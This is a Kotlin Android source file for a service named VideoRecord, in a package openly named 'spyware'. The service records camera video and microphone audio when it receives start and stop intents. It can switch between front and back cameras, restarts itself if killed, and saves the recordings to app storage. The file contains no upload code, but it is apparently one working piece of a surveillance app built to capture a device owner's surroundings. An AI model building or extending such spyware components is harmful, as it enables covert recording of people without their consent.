package com.mhl.spyware

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class VideoRecord : Service() {


    private var mediaRecorder: MediaRecorder? = null
    private var cameraDevice: CameraDevice? = null
    private var cameraCaptureSession: CameraCaptureSession? = null
    private lateinit var cameraManager: CameraManager

    // "0" = back camera, "1" = front camera
    private var currentCameraId = "0"
    private var isRecording = false

    companion object {
        private const val NOTIFICATION_ID = 1
        private const val CHANNEL_ID = "VideoRecorderChannel"
        var lastRecordedFileUri: String? = null
    }

    @SuppressLint("ForegroundServiceType")
    override fun onCreate() {
        super.onCreate()
        cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createNotification())
    }
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {

        when (intent?.action) {
            "START_RECORDING" -> {
                // Extract the camera ID from the Intent extras
                val cameraId = intent.getStringExtra("cameraId") ?: "0"

                // Log for debugging purposes
                Log.d("VideoRecorderService", "Starting recording with camera ID: $cameraId")


                currentCameraId = cameraId

                startRecording()
            }
            "VIDEO_STOP" -> {
                Log.d("VideoRecorderService", "Stopping recording...")
                stopRecording()
            }
        }

        return START_STICKY // Service will be restarted if it's killed by the system
    }

    /**
     * Create the notification channel for Android O and above.
     */
    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Video Recorder Service",
            NotificationManager.IMPORTANCE_DEFAULT
        ).apply {
            lightColor = Color.BLUE
            lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        }
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.createNotificationChannel(channel)
    }

    /**
     * Create a persistent notification so the service can run in the foreground.
     */
    private fun createNotification(): Notification {
        val notificationIntent = Intent(this, MainActivity::class.java)

        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            notificationIntent,
            PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Video Recording Service")
            .setContentText("Recording in background")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentIntent(pendingIntent)
            .build()
    }

    /**
     * Start the actual video recording process.
     */
    private fun startRecording() {
        if (isRecording) return

        try {
            setupMediaRecorder()
            openCamera()
        } catch (e: Exception) {
            Log.e("VideoRecorderService", "Error starting recording: ${e.message}")
        }
    }


    private fun setupMediaRecorder() {
        val videoFile = createVideoFile()
        lastRecordedFileUri = videoFile.absolutePath

        Log.d("VideoRecorderService", "Setting up MediaRecorder to save at: $lastRecordedFileUri")

        mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(this)
        } else {
            @Suppress("DEPRECATION")
            (MediaRecorder())
        }.apply {
            setAudioSource(MediaRecorder.AudioSource.MIC)
            setVideoSource(MediaRecorder.VideoSource.SURFACE)
            setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)

            setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            setAudioEncodingBitRate(128000)
            setAudioSamplingRate(44100)

            setVideoEncoder(MediaRecorder.VideoEncoder.H264)
            setVideoSize(1920, 1080)
            setVideoFrameRate(30)
            setVideoEncodingBitRate(10_000_000)

            setOutputFile(videoFile.absolutePath)

            try {
                prepare()
            } catch (e: Exception) {
                Log.e("VideoRecorderService", "Error preparing MediaRecorder: ${e.message}")
                e.printStackTrace()
            }
        }
    }

    /**
     * Create a unique filename for the video based on timestamp.
     */
    private fun createVideoFile(): File {
        val timeStamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val videoFileName = "VIDEO_${timeStamp}"


        val storageDir = File(getExternalFilesDir(null), "videos")
        if (!storageDir.exists()) {
            storageDir.mkdirs()
        }

        val videoFile = File(storageDir, "$videoFileName.mp4")
        lastRecordedFileUri = videoFile.absolutePath
        Log.d("VideoRecorderService", "Video will be saved to: ${videoFile.absolutePath}")

        return videoFile
    }


    private fun openCamera() {
        try {

            cameraManager.openCamera(currentCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createCaptureSession()
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    cameraDevice = null
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    cameraDevice = null
                }
            }, null)
        } catch (e: SecurityException) {
            Log.e("VideoRecorderService", "Security Exception: ${e.message}")
        }
    }

    /**
     * Create a capture session so the camera's output can be sent to the MediaRecorder's surface.
     */
    private fun createCaptureSession() {
        val surface = mediaRecorder?.surface ?: return

        try {
            cameraDevice?.createCaptureSession(
                listOf(surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        cameraCaptureSession = session
                        val captureRequest = cameraDevice
                            ?.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
                            ?.apply { addTarget(surface) }
                            ?.build()

                        session.setRepeatingRequest(captureRequest!!, null, null)
                        mediaRecorder?.start()
                        isRecording = true
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e("VideoRecorderService", "Failed to configure capture session")
                    }
                },
                null
            )
        } catch (e: Exception) {
            Log.e("VideoRecorderService", "Error creating capture session: ${e.message}")
        }
    }

    /**
     * Stop the ongoing recording and release resources.
     */
    private fun stopRecording() {
        try {
            cameraCaptureSession?.stopRepeating()
            cameraCaptureSession?.close()
            cameraDevice?.close()

            mediaRecorder?.apply {
                try {
                    stop()
                } catch (e: IllegalStateException) {
                    Log.e("VideoRecorderService", "MediaRecorder already stopped")
                }
                reset()
                release()
            }

            cameraCaptureSession = null
            cameraDevice = null
            mediaRecorder = null
            isRecording = false

        } catch (e: Exception) {
            Log.e("VideoRecorderService", "Error stopping recording: ${e.message}")
        }
    }



    override fun onDestroy() {
        stopRecording()
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}